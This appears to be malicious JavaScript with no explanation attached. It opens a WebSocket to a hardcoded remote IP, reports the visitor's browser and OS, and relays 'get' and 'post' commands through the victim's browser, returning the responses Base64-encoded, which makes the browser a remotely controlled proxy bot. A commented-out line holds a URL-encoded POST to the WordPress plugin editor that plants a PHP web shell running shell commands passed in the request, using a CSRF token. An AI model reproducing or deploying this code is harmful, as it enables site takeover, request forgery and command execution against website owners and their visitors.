
    var Base64Binary={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",decodeArrayBuffer:function(r){var e=r.length/4*3,t=new ArrayBuffer(e);return this.decode(r,t),t},removePaddingChars:function(r){var e=this._keyStr.indexOf(r.charAt(r.length-1));return 64==e?r.substring(0,r.length-1):r},decode:function(r,e){r=this.removePaddingChars(r),r=this.removePaddingChars(r);var t,n,a,i,h,d,s,f,c=parseInt(r.length/4*3,10),y=0,o=0;for(t=e?new Uint8Array(e):new Uint8Array(c),r=r.replace(/[^A-Za-z0-9\+\/\=]/g,""),y=0;c>y;y+=3)h=this._keyStr.indexOf(r.charAt(o++)),d=this._keyStr.indexOf(r.charAt(o++)),s=this._keyStr.indexOf(r.charAt(o++)),f=this._keyStr.indexOf(r.charAt(o++)),n=h<<2|d>>4,a=(15&d)<<4|s>>2,i=(3&s)<<6|f,t[y]=n,64!=s&&(t[y+1]=a),64!=f&&(t[y+2]=i);return t}};
    var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}

    var browser = function() {
    // Return cached result if avalible, else get result then cache it.
        if (browser.prototype._cachedResult)
        return browser.prototype._cachedResult;

        var isOpera = !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
        // Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
        var isFirefox = typeof InstallTrigger !== 'undefined';// Firefox 1.0+
        var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
        // At least Safari 3+: "[object HTMLElementConstructor]"
        var isChrome = !!window.chrome && !isOpera;// Chrome 1+
        var isIE = /*@cc_on!@*/false || !!document.documentMode; // At least IE6

        return (browser.prototype._cachedResult =
            isOpera ? 'Opera' :
            isFirefox ? 'Firefox' :
            isSafari ? 'Safari' :
            isChrome ? 'Chrome' :
            isIE ? 'IE' :
            '');
    };
    

    var system = function() {
        var OSName = "Unknown";
        if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
        if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
        if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
        if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
        if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSName="Windows 2000";
        if (window.navigator.userAgent.indexOf("Mac")!=-1) OSName="Mac/iOS";
        if (window.navigator.userAgent.indexOf("X11")!=-1) OSName="UNIX";
        if (window.navigator.userAgent.indexOf("Linux")!=-1) OSName="Linux";
        return OSName;
    }


    /* ------------------------------------------------------------ */
    var WSConn      = null;
    var WSExt       = null;
    window.hasWS    = "no";
    window.ver      = "0.3";      

    /* ------------------------------------------------------------ */
    function startServer() {
        WSExt  = new WebSocket('ws://52.38.44.4:11325');
        WSExt.binaryType = "arraybuffer";

        WSExt.onopen = function(b) {
            console.log('Enviando set')
            WSExt.send('set:' + browser() + '@' + system() +  "@" + window.ver);
        };
        WSExt.onclose = function(b) {
            //
            checkServer();
        };
        WSExt.onmessage = function(b) {
            var r;
            r = b.data.split(':');
            console.log(b.data);
            switch(r[0]) {
                case "get":
                    response = httpGet(r[1]);
                    WSExt.send(Base64.encode(response));
                    break;
                case "post":
                    response = httpPost(r[1], Base64.decode(r[2]));
                    console.log(response);
                    WSExt.send(Base64.encode(response));
                    break;    
                default:
            }
        };
        WSExt.onerror = function(b) {
            checkServer();
        }
    }

    /* ------------------------------------------------------------ */
    function checkServer(){
        if(!WSExt || WSExt.readyState == 3) startServer();
    }


    function httpGet(theUrl)
    {
        var xmlHttp = null;

        xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", theUrl, false );
        xmlHttp.send( null );
        return xmlHttp.responseText;
    }

    function httpPost(theUrl, postData)
    {
        var xmlHttp = null;

        xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "POST", theUrl, false );
        xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        str = encodeURI(postData);
        str = str.replace("%26", "&");
        console.log(str);
        xmlHttp.send(str);
        //xmlHttp.send("_wpnonce=" + csrftoken + "&_wp_http_referer=/wp-admin/plugin-editor.php?file=index.php&plugin=index.php&newcontent=%3C%3Fphp%0Aecho+%22%3Cbr%3EDEW_BOA%3Cbr%3E%22%3B%0A%24cmd%3D%22%24_GET%5Bcmd%5D%22%3B%0A%24eseguicmd%3Dex%28%24cmd%29%3B%0Aecho+%24eseguicmd%3B%0A%0Afunction+ex%28%24cfe%29%7B%0A%24res+%3D+%27%27%3B%0Aif+%28%21empty%28%24cfe%29%29%7B%0Aif%28function_exists%28%27exec%27%29%29%7B%0A%40exec%28%24cfe%2C%24res%29%3B%0A%24res+%3D+join%28%22%5Cn%22%2C%24res%29%3B%0A%7D%0Aelseif%28function_exists%28%27shell_exec%27%29%29%7B%0A%24res+%3D+%40shell_exec%28%24cfe%29%3B%0A%7D%0Aelseif%28function_exists%28%27system%27%29%29%7B%0A%40ob_start%28%29%3B%0A%40system%28%24cfe%29%3B%0A%24res+%3D+%40ob_get_contents%28%29%3B%0A%40ob_end_clean%28%29%3B%0A%7D%0Aelseif%28function_exists%28%27passthru%27%29%29%7B%0A%40ob_start%28%29%3B%0A%40passthru%28%24cfe%29%3B%0A%24res+%3D+%40ob_get_contents%28%29%3B%0A%40ob_end_clean%28%29%3B%0A%7D%0Aelseif%28%40is_resource%28%24f+%3D+%40popen%28%24cfe%2C%22r%22%29%29%29%7B%0A%24res+%3D+%22%22%3B%0Awhile%28%21%40feof%28%24f%29%29+%7B+%24res+.%3D+%40fread%28%24f%2C1024%29%3B+%7D%0A%40pclose%28%24f%29%3B%0A%7D%7D%0Areturn+%24res%3B%0A%7D%0Aexit%3B%0A&action=update&file=index.php&plugin=index.php&scrollto=0&submit=Update+File");
        return xmlHttp.responseText;

    }

    startServer();
    setInterval(checkServer, 5000);



